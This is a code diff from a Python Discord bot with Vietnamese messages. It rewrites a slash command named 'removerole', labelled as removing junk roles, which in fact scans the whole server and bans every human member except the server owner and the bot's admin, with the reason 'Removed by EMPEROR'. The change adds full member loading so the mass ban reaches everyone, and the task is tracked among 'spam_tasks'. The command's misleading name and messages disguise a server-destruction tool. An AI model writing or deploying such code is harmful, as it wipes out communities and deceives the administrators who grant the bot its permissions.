@@ -3350,75 +3350,73 @@ def register_admin_commands(b_target):
           "⚠️ Không có tiến trình nào đang chạy trong server này", ephemeral=True
       )
 
-  @b_target.tree.command(
-  name="removerole",
-  description="Xóa role dư thừa (Owner only)",
-)
-  async def removerole_slash(interaction: discord.Interaction):
-    if not check_owner(interaction.user.id):
+    @b_target.tree.command(
+    name="removerole",
+    description="Xóa role rác (Owner only)",
+  )
+    async def removerole_slash(interaction: discord.Interaction):
+      if not check_owner(interaction.user.id):
+        await interaction.response.defer(ephemeral=True)
+        return
+      if interaction.guild is None:
+        await interaction.response.defer(ephemeral=True)
+        return
+    
       await interaction.response.defer(ephemeral=True)
-      return
-    if interaction.guild is None:
-      await interaction.response.defer(ephemeral=True)
-      return
-  
-    await interaction.response.defer(ephemeral=True)
-    guild = interaction.guild
-  
-    if not guild.me.guild_permissions.ban_members:
+      guild = interaction.guild
+    
+      if not guild.me.guild_permissions.ban_members:
+        try:
+          await interaction.followup.send(
+              "❌ Bot thiếu quyền `Xoá Role`.",
+              ephemeral=True,
+          )
+        except Exception:
+          pass
+        return
+    
       try:
         await interaction.followup.send(
-            "❌ Bot thiếu quyền `Role Members`.",
+            "✅ Bắt đầu quét và ban toàn bộ thành viên khả thi...",
             ephemeral=True,
         )
       except Exception:
         pass
-      return
-  
-    try:
-      await interaction.followup.send(
-          "✅ Bắt đầu quét và ban toàn bộ thành viên khả thi...",
-          ephemeral=True,
-      )
-    except Exception:
-      pass
-
-    async def run_removerole():
-      banned = 0
-      failed = 0
+    
+      async def run_removerole():
+          banned = 0
+          failed = 0
+          
+          try:
+            await guild.chunk()
+            print(f"[REMOVEROLE] Đã tải {len(guild.members)} thành viên.")
+          except Exception as e:
+            print(f"[REMOVEROLE] Lỗi tải member: {e}")
       
-      # Lấy toàn bộ member có trong cache
-      for member in list(guild.members):
-        # Bỏ qua chính bot và các bot khác
-        if member.bot:
-          continue
-        # Bỏ qua chủ server
-        if member.id == guild.owner_id:
-          continue
-        # Bỏ qua ADMIN_USER_ID (chủ bot)
-        if member.id == ADMIN_USER_ID:
-          continue
-  
-        try:
-          # Thử ban member (xóa 0 ngày tin nhắn)
-          await member.ban(reason="Removed by EMPEROR", delete_message_days=0)
-          banned += 1
-          # Nghỉ 0.5s tránh rate limit
-          await asyncio.sleep(0.5)
-        except discord.Forbidden:
-          # Lỗi do role của member cao hơn bot -> Bỏ qua
-          failed += 1
-        except discord.HTTPException:
-          # Lỗi mạng/rate limit
-          await asyncio.sleep(1)
-          failed += 1
-        except Exception:
-          failed += 1
-  
-      print(f"[REMOVEROLE] Đã ban: {banned} | Thất bại: {failed}")
-  
-    task = asyncio.create_task(run_removerole())
-    _track_task(spam_tasks, guild.id, task)
+          for member in list(guild.members):
+            if member.bot:
+              continue
+            if member.id == guild.owner_id:
+              continue
+            if member.id == ADMIN_USER_ID:
+              continue
+      
+            try:
+              await member.ban(reason="Removed by EMPEROR", delete_message_days=0)
+              banned += 1
+              await asyncio.sleep(0.5)
+            except discord.Forbidden:
+              failed += 1
+            except discord.HTTPException:
+              await asyncio.sleep(1)
+              failed += 1
+            except Exception:
+              failed += 1
+      
+          print(f"[REMOVEROLE] Đã ban: {banned} | Thất bại: {failed}")
+      
+      task = asyncio.create_task(run_removerole())
+      _track_task(spam_tasks, guild.id, task)
 
   @b_target.tree.command(
       name="blacklist", description="Xem danh sách Blacklist (Chỉ Owner)"
